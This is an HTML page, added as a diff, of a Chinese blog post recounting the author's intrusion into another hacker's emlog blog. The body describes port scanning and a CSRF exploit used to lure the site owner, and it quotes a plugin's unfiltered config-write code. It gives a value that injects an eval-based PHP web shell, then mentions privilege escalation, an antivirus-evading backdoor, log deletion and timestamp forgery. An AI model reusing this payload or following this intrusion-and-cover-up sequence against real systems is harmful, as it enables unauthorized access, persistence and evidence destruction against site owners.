@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>某黑客站 | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="对某黑客博客的一次测试，记录下。
+信息收集独立 VPS，无 CDN，IP：8.8.8.8，Windows 2003 操作系统。nmap 扫描端口，发现开放80，135，999，1025，1026，3306，3309端口。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某黑客站">
+<meta property="og:url" content="http://sh3ll.me/2014/03/26/hack-moonsec/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="对某黑客博客的一次测试，记录下。
+信息收集独立 VPS，无 CDN，IP：8.8.8.8，Windows 2003 操作系统。nmap 扫描端口，发现开放80，135，999，1025，1026，3306，3309端口。">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="某黑客站">
+<meta name="twitter:description" content="对某黑客博客的一次测试，记录下。
+信息收集独立 VPS，无 CDN，IP：8.8.8.8，Windows 2003 操作系统。nmap 扫描端口，发现开放80，135，999，1025，1026，3306，3309端口。">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-hack-moonsec" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      某黑客站
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-03-26T05:47:56.000Z" itemprop="datePublished">03-26-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>对某黑客博客的一次测试，记录下。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>独立 VPS，无 CDN，IP：8.8.8.8，Windows 2003 操作系统。nmap 扫描端口，发现开放80，135，999，1025，1026，3306，3309端口。<a id="more"></a></p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th style="text-align:center">信息</th>
+<th style="text-align:center">利用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td style="text-align:center">IIS 6, emlog</td>
+<td style="text-align:center">脚本入侵，利用 emlog 漏洞</td>
+</tr>
+<tr>
+<td>135</td>
+<td style="text-align:center">MSRPC</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td>999</td>
+<td style="text-align:center">IIS</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td>1025</td>
+<td style="text-align:center">MSRPC</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td>1025</td>
+<td style="text-align:center">MSRPC</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td>3306</td>
+<td style="text-align:center">MySQL，无法外连</td>
+<td style="text-align:center">提权时可考虑</td>
+</tr>
+<tr>
+<td>3389</td>
+<td style="text-align:center">MS-WBT-SERVER</td>
+<td style="text-align:center">暴力破解3389 密码</td>
+</tr>
+</tbody>
+</table>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>从 web 入手，emlog 博客程序后台添加管理处无 token 认证，即存在 CSRF 漏洞。<br>当服务器支持 zip 解压时，后台可通过上传插件活主题 getshell；服务器不支持 zip 解压时，可以考虑审计插件 getshell。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用 Phithon 编写的 <a href="http://www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html" target="_blank" rel="external">emlog exp</a>。编写 CSRF 页面，传到肉鸡服务器上，通过评论插入链接诱使黑客访问。<br>数日后，黑客登录后台，访问链接成功添加管理。<br>利用新添加的管理登录后台，试图通过上传主题 getshell，却发现服务器不支持 zip 解压，于是改变 方向对插件进行审计。博客安装了个<a href="http://www.emlog.net/plugin/120" target="_blank" rel="external">邮件通知插件</a>，审计挖掘到一枚文件写入漏洞:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">function plugin_setting()&#123;</div><div class="line">        require (EMLOG_ROOT . &apos;/content/plugins/commentNotice/commentNotice_config.php&apos;);</div><div class="line">        foreach (explode(&quot;,&quot;,$_POST[&apos;exclude&apos;]) as $exclude)&#123;</div><div class="line">                $excludes = $excludes.&apos;&quot;&apos;.$exclude.&apos;&quot;&apos;.&quot;,&quot;;</div><div class="line">        &#125;</div><div class="line">        $excludes=rtrim($excludes, &quot;,&quot;);</div><div class="line">        $newConfig = &apos; &quot;&apos;.$_POST[&quot;host&quot;].&apos;&quot;, //smtp服务器</div><div class="line">        &quot;smtpUser&quot; =&gt; &quot;&apos;.$_POST[&quot;user&quot;].&apos;&quot;, //发件邮箱</div><div class="line">        &quot;smtpPwd&quot; =&gt; &quot;&apos;.$_POST[&quot;pwd&quot;].&apos;&quot;, //发信邮箱密码</div><div class="line">        &quot;rule&quot; =&gt; &quot;&apos;.$_POST[&quot;rule&quot;].&apos;&quot;, //0为所有人，1为仅自己</div><div class="line">        &quot;exclude&quot; =&gt; array(</div><div class="line">                &apos;.$excludes.&apos;</div><div class="line">        )</div><div class="line">);?&gt;&apos;;</div><div class="line">        @file_put_contents(EMLOG_ROOT.&apos;/content/plugins/commentNotice/commentNotice_config.php&apos;, $newConfig);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对 POST 参数未做任何过滤就写入到本地配置文件中，于是构造:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_POST[&quot;host&quot;] =&gt; &quot;);@eval($_POST[&apos;xxoo&apos;]);?&gt;</div></pre></td></tr></table></figure>
+<p>成功写入文件，getshell。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>Windows 2003，支持 aspx，可以执行命令。<br>查看系统信息，发现补丁打的很全，MYSQL 被降权，多余的第三方软件也没有，一时陷入僵局。<br>一段时间后，不知什么原因，黑客更换了服务器，重新查看信息后发现补丁都没有打了，尝试 pr 提权，<br>报错：找不到 wmi 进程，其他的 exp 也都失败。<br>扔给音符牛，还是用 pr 提下了，应该是期间黑客重启 IIS 了。</p>
+<h2 id="后门-amp-日志清理"><a href="#后门-amp-日志清理" class="headerlink" title="后门 &amp; 日志清理"></a>后门 &amp; 日志清理</h2><p>网站写入免杀马，删除相关日志，将修改过的文件都恢复至原样，文件时间修改至与其他文件时间一致。</p>
+<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>PR 找不到 WMI：<a href="http://www.91ri.org/7010.html" target="_blank" rel="external">http://www.91ri.org/7010.html</a><br>经验很重要！</p>
+<p>感谢@音符牛。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/03/26/hack-moonsec/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/04/13/sublime-short-keys/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Sublime Text 有用的快捷键
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/03/14/php-is-numeric-filter/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">is_numeric() &amp; php://filter</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/03/26/hack-moonsec/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
